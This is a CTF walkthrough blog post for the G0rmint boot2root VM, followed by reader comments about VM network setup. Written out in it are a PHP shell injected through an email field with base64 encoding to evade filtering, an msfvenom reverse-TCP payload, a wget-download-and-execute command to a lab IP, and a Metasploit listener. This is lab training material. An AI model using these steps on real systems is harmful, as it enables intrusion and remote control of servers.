@@ -1,0 +1,336 @@
+
+								
+																		Hack the G0rmint VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on November 27, 2017
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another CTF challenge known as G0rmint. The credit for making this vm machine goes to “Noman Riffat” and it is another boot2root challenge where we have to root the server to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.134 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration.
+nmap 192.168.1.134
+
+Nmap scan shows us port 80 is open, so we open the ip address in our browser.
+We don’t find any page. So we use dirb to find the directories for more information.
+dirb http://192.168.1.134/
+
+We open robots.txt and find a directory called /g0rmint/. 
+
+When we open the directory we find a login page.
+
+We take a look at the source code for more information.
+
+ 
+When we take a look at the source code we find a backup directory called s3cretbackupdirectory/ We use dirb to enumerate files or pages in that directory.
+dirb http://192.168.1.134/g0rmint/s3cretbackupdirect0ry
+
+We find a page called info.php when we open it we find a file name backup.zip.
+
+We download the file for further information.
+
+We extract the zip file and find that the file contains the source code for the webpage.
+
+Now we take look inside style.css and we look at the name of the author.
+cat style.css | grep Author
+
+We use these details as username and email for reset password.
+
+We now take a look at reset.php file.
+
+We find that the new password is based on the time we reset our password. We create a  php file that generates a password based on the time displayed on the page.
+
+Now we generate the password using our php script.
+
+We go to the login page and use the email we find in the css file and use the password we just generated to login.
+
+Now that we are authorized we take a look at the log file. In the config.php  we find that the logs are stored in s3r3t-dir3ct0ry-f0r-l0gs/ directory in the file name  format yy-mm-dd.php
+
+Now we use the current date to open the log file.
+
+Now we use upload basic php shell through email address. We put base64 decode so that we can bypass input firewall.
+
+Now we convert our commands to base64, then we use those base64 encoded string to execute our command in the server.
+
+When we execute our command the server runs it and we are able to see the files in that directory of the server.
+
+Now we create an elf shell with msfvenom.
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.116 lport=4444 -f elf &gt; /var/www/html/shell
+To upload our shell, we convert our commands to base64.
+echo ‘wget http://192.168.1.116/shell; chmod +x shell; ./shell’ | base64
+
+Now we setup our listener using metasploit.
+msf &gt; use multi/handler
+msf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.1.116
+msf exploit(handler) &gt; set lport 4444
+msf exploit(handler) &gt; run
+Now when we execute our command we get our reverse_shell
+
+Now going through the files in the /var/www folder we find a file called backup.zip. when we try to extract it we find that it can be only extracted in tmp folder so we extract the zip file in /tmp/ folder.
+unzip backup.zip -d /var/tmp
+
+After extracting the zip file, we take a look inside the folder we extracted the files we find a sql file.
+
+When we open the file we find a md5 encode password for the user g0rmint.
+cat /var/tmp/db.sql | grep noman
+
+Then we when we decrypt our md5 encode hash we find a password ‘tayyab123’.
+
+We use this to connect through ssh.
+ssh [email protected]
+After connecting through ssh we use this password to gain root access.
+When we get root access we go to root folder inside the root folder we get a file called flag.txt. when we open the file we get a congratulatory message for the completion of VM.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								n00b December 5, 2017 at 5:19 pm							
+							
+							
+														
+							
+								Hello
+i am new into CTF, as you said we will have to find IP? it is by using netdiscover?
+i tried i got list of IP’s i tried all in browser no one showed me up anything.
+Plus i have downloade this vm, does i have to turn on it? or i have to paste it somewhere in Kali machine folder so it can detect IP.
+Need help, n00b here
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								n00b December 5, 2017 at 5:21 pm							
+							
+							
+														
+							
+								all i got is this http://prntscr.com/hjhecj
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								woowyland December 23, 2017 at 2:51 pm							
+							
+							
+														
+							
+								The IPs may defer for everyone. There are nearly infinite ways to discover the IP for your target for example, nmap, arp-scan, netdiscover and more…
+I’ve viewed your screenshot, try check your network setting for your box.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								n00b January 31, 2018 at 10:19 am							
+							
+							
+														
+							
+								i know how to get ip of network. my question i have downloaded that vm. i have installed VirtualBox in kali as well to run that VM.
+now when i open terminal in kali and type netdiscover, it didnt get ip of that vm. 
+What are initial steps to follow for starting a ctf like this? should i leave that vm kept running in background in virtualbox so kali netdiscover picks it IP that another machine is in running?
+my question may be funny but i am stuck with this basic thing here. i dont know what i am doing wrong.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Raj Chandel February 1, 2018 at 7:22 am							
+							
+							
+														
+							
+								Open the vm in virtualbox and keep it running in background. After it boots then you can use netdiscover to find the ip of the VM.
+								
+															
+							
+							
+							
+															
+							
+						
+							
+								n00b February 1, 2018 at 9:52 pm							
+							
+							
+														
+							
+								hey
+i have turned on g0rmint on vmware via windows10 and also kali linux on same vm
+when i type netdiscover over kali it give me 3 ips 3 out of 3 arent of g0rmint. 
+Will it work like this? or i have to run g0rmint via kali linux ( install virtual box in kali and run g0rmint in it)
+								
+															
+							
+							
+							
+															
+							
+						
+							
+								Raj Chandel February 2, 2018 at 9:30 am							
+							
+							
+														
+							
+								Either the VM is corrupt or you can try changing the network to bridged in vmware.
+								
+															
+							
+							
+							
+															
+							
+						
+							
+								Arme January 29, 2018 at 9:54 pm							
+							
+							
+														
+							
+								Thanks for your article.
+Would you please type the full command for phd shell you used to inject through email email address.
+Thanks
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Raj Chandel January 30, 2018 at 7:05 am							
+							
+							
+														
+							
+								contact [email protected]
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								n00b October 26, 2018 at 8:00 pm							
+							
+							
+														
+							
+								Raj can you help here.
+i am stucked here. Please guide.
+i download g0rmint machine, should i run it in my Kali Linux machine (running on vmware in windows7) and run it on VirtualBox in Kali? or should i run it on main machine which is Windows 7 with Vmware?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
